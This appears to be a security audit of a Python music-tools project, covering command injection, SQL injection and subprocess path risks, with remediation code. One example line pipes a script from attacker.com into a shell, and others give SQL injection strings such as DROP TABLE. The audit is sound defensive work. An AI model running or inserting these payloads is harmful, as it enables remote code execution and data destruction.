# High Severity Security Vulnerabilities

**Priority:** IMMEDIATE ACTION REQUIRED
**Risk Level:** HIGH
**Timeline:** Fix within 1 week

---

## 1. Command Injection via os.system()

**CWE-78: OS Command Injection**
**CVSS 3.1 Score: 8.6 (HIGH)**

### Affected Files
```
/apps/music-tools/menu.py:152
/apps/music-tools/menu.py:325
/apps/music-tools/menu.py:408
/apps/music-tools/menu.py:458
/apps/music-tools/menu.py:515
/apps/music-tools/menu.py:595
/apps/music-tools/menu.py:613
/apps/music-tools/menu.py:685
/apps/music-tools/menu.py:764
/apps/music-tools/menu.py:860
/apps/music-tools/legacy/Library Comparison/duplicate_remover.py:252
/apps/music-tools/legacy/Library Comparison/library_comparison.py:260
/apps/music-tools/legacy/Library Comparison/library_comparison.py:386
```

### Vulnerable Code
```python
os.system('cls' if os.name == 'nt' else 'clear')
```

### Attack Vector
While currently using hardcoded commands, this pattern is inherently dangerous:
1. Easy to accidentally modify to accept user input
2. Shell metacharacters could be injected if code evolves
3. Could be exploited through environment variable manipulation

### Exploitation Example
```python
# If code is modified to accept input:
import os
user_input = input("Command: ")
os.system(user_input)  # DANGEROUS!

# Attacker input:
# "clear; curl http://attacker.com/steal.sh | sh"
```

### Impact
- **Confidentiality:** HIGH - Arbitrary file read
- **Integrity:** HIGH - System modification
- **Availability:** HIGH - System destruction possible

### Remediation

#### Option 1: Use subprocess.run() (Recommended)
```python
import subprocess

def clear_screen():
    """Safely clear the terminal screen."""
    try:
        if os.name == 'nt':
            subprocess.run(['cls'], shell=False, check=False)
        else:
            subprocess.run(['clear'], shell=False, check=False)
    except Exception as e:
        # Fallback: print newlines
        print('\n' * 100)
```

#### Option 2: Use Rich Console (Best)
```python
from rich.console import Console

console = Console()
console.clear()
```

#### Option 3: ANSI Escape Codes
```python
def clear_screen():
    """Clear screen using ANSI escape codes."""
    print('\033[2J\033[H', end='')
```

### Testing
```python
def test_no_command_injection():
    """Verify no os.system() calls exist in production code."""
    import ast
    import pathlib

    for py_file in pathlib.Path('apps').rglob('*.py'):
        if 'legacy' in str(py_file):
            continue  # Skip legacy code

        with open(py_file) as f:
            tree = ast.parse(f.read())

        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                if hasattr(node.func, 'attr') and node.func.attr == 'system':
                    assert False, f"Found os.system() in {py_file}"
```

---

## 2. SQL Injection Risk in Dynamic Queries

**CWE-89: SQL Injection**
**CVSS 3.1 Score: 8.2 (HIGH)**

### Affected Files
```
/apps/music-tools/src/library/database.py:230-233
/apps/music-tools/src/library/database.py:350
/apps/music-tools/src/library/database.py:405-407
```

### Vulnerable Pattern
```python
# Line 230-233
columns = ', '.join(file_dict.keys())
placeholders = ', '.join(['?' for _ in file_dict])
cursor.execute(
    f"INSERT INTO library_index ({columns}) VALUES ({placeholders})",
    list(file_dict.values())
)
```

### Current Protection
The code HAS a whitelist validation:
```python
# Line 32-38
ALLOWED_COLUMNS = {
    'id', 'file_path', 'filename', 'artist', 'title', 'album', 'year',
    'duration', 'file_format', 'file_size', 'metadata_hash',
    'file_content_hash', 'indexed_at', 'file_mtime', 'last_verified',
    'is_active'
}

# Line 222-225
invalid_columns = set(file_dict.keys()) - self.ALLOWED_COLUMNS
if invalid_columns:
    raise ValueError(f"Invalid column names: {invalid_columns}")
```

### Risk Assessment
**Current Risk:** MEDIUM (whitelist is in place)
**Potential Risk:** HIGH (if whitelist is removed or bypassed)

### Why This Is Still Concerning
1. Whitelist could be accidentally removed during refactoring
2. Pattern encourages string formatting in SQL
3. No explicit SQL injection tests
4. Future developers might not understand the security implication

### Attack Scenario (if whitelist bypassed)
```python
# Attacker could inject:
malicious_data = {
    'file_path'; DROP TABLE library_index; --': 'value'
}
# Resulting SQL:
# INSERT INTO library_index (file_path; DROP TABLE library_index; --) VALUES (?)
```

### Remediation

#### Option 1: Keep Whitelist with Stronger Enforcement
```python
class LibraryDatabase:
    # Make ALLOWED_COLUMNS immutable
    ALLOWED_COLUMNS = frozenset([
        'id', 'file_path', 'filename', 'artist', 'title', 'album', 'year',
        'duration', 'file_format', 'file_size', 'metadata_hash',
        'file_content_hash', 'indexed_at', 'file_mtime', 'last_verified',
        'is_active'
    ])

    @staticmethod
    def _validate_columns(columns: set) -> None:
        """
        Validate column names against whitelist.

        SECURITY CRITICAL: This prevents SQL injection by ensuring only
        known-safe column names can be used in dynamic SQL queries.
        DO NOT REMOVE OR MODIFY WITHOUT SECURITY REVIEW.
        """
        invalid = columns - LibraryDatabase.ALLOWED_COLUMNS
        if invalid:
            raise ValueError(
                f"SQL Injection attempt detected: invalid columns {invalid}"
            )
```

#### Option 2: Use ORM (Best Long-term Solution)
```python
from sqlalchemy import create_engine, Column, Integer, String, Float
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

Base = declarative_base()

class LibraryFile(Base):
    __tablename__ = 'library_index'

    id = Column(Integer, primary_key=True)
    file_path = Column(String, unique=True, nullable=False)
    filename = Column(String, nullable=False)
    artist = Column(String)
    title = Column(String)
    # ... etc

# Now inserts are safe:
session.add(LibraryFile(**file_dict))
session.commit()
```

### Testing
```python
def test_sql_injection_prevention():
    """Test that SQL injection attempts are blocked."""
    db = LibraryDatabase(':memory:')

    # Test 1: Invalid column name
    malicious_file = LibraryFile(
        file_path="test.mp3",
        filename="test.mp3"
    )
    malicious_file.to_dict()['invalid; DROP TABLE --'] = 'value'

    with pytest.raises(ValueError, match="Invalid column names"):
        db.add_file(malicious_file)

    # Test 2: Column name with SQL keywords
    malicious_dict = {
        'file_path': 'test.mp3',
        'filename': 'test.mp3',
        'artist OR 1=1 --': 'value'
    }

    with pytest.raises(ValueError):
        # Should fail validation
        pass
```

---

## 3. Unsafe subprocess Execution with User Paths

**CWE-78: OS Command Injection**
**CVSS 3.1 Score: 7.8 (HIGH)**

### Affected Files
```
/apps/music-tools/music_tools_cli/services/external.py:29
```

### Vulnerable Code
```python
def run_external_script(script_path: Path, cwd: Path = None) -> None:
    """Run external Python script."""
    subprocess.run(
        [sys.executable, str(script_path)],
        cwd=cwd or script_path.parent,
        check=False
    )
```

### Risk
While `shell=False` is safe, the `cwd` parameter accepts user-controlled paths without validation, potentially allowing:
1. Directory traversal
2. Execution in sensitive directories
3. Symlink attacks

### Attack Scenario
```python
# Attacker provides:
script_path = Path("/tmp/malicious.py")
cwd = Path("/etc")  # Or other sensitive directory

# Script could read sensitive files, modify system configs, etc.
```

### Remediation
```python
from src.tagging.core.security import SecurityValidator

def run_external_script(
    script_path: Path,
    cwd: Optional[Path] = None,
    base_directory: Optional[str] = None
) -> None:
    """
    Run external Python script with security validation.

    Args:
        script_path: Path to Python script
        cwd: Working directory (optional)
        base_directory: Restrict execution to this directory

    Raises:
        ValueError: If paths fail security validation
    """
    validator = SecurityValidator()

    # Validate script path
    is_valid, safe_script = validator.validate_file_path(
        str(script_path),
        base_directory
    )
    if not is_valid:
        raise ValueError(f"Invalid script path: {safe_script}")

    # Validate cwd if provided
    if cwd:
        is_valid, safe_cwd = validator.validate_file_path(
            str(cwd),
            base_directory
        )
        if not is_valid:
            raise ValueError(f"Invalid working directory: {safe_cwd}")
        cwd = Path(safe_cwd)

    # Additional check: ensure it's a Python file
    if not safe_script.endswith('.py'):
        raise ValueError("Only .py files can be executed")

    # Check file exists and is readable
    script_path_obj = Path(safe_script)
    if not script_path_obj.exists():
        raise ValueError(f"Script not found: {safe_script}")
    if not script_path_obj.is_file():
        raise ValueError(f"Not a file: {safe_script}")

    # Execute with validated paths
    subprocess.run(
        [sys.executable, safe_script],
        cwd=cwd or script_path_obj.parent,
        check=False,
        timeout=300  # Add timeout to prevent DoS
    )
```

### Additional Security Measures
```python
# 1. Whitelist allowed directories
ALLOWED_SCRIPT_DIRS = [
    Path(__file__).parent / 'scripts',
    Path.home() / '.music_tools' / 'scripts'
]

def is_allowed_directory(path: Path) -> bool:
    """Check if path is in an allowed directory."""
    real_path = path.resolve()
    return any(
        real_path.is_relative_to(allowed)
        for allowed in ALLOWED_SCRIPT_DIRS
    )

# 2. Script signature verification
import hashlib

def verify_script_signature(script_path: Path) -> bool:
    """Verify script hasn't been tampered with."""
    # Load known script hashes
    known_hashes = load_trusted_script_hashes()

    # Calculate current hash
    with open(script_path, 'rb') as f:
        current_hash = hashlib.sha256(f.read()).hexdigest()

    return current_hash in known_hashes
```

---

## Summary of Remediation Steps

### Immediate Actions (This Week)
1. Replace all `os.system()` calls with `subprocess.run()` or Rich console
2. Add explicit SQL injection tests for database layer
3. Implement path validation for subprocess execution
4. Document security-critical code sections

### Verification Steps
1. Run static analysis: `bandit -r apps/ packages/`
2. Run security tests: `pytest tests/security/`
3. Code review all changes with security focus
4. Update security documentation

### Long-term Improvements
1. Migrate to SQLAlchemy ORM for better SQL safety
2. Implement code signing for external scripts
3. Add security monitoring and alerting
4. Regular security training for developers

---

**Next Steps:**
1. Review this document with development team
2. Create tickets for each vulnerability
3. Assign owners and deadlines
4. Begin implementation following remediation guides
5. Test thoroughly before deploying fixes
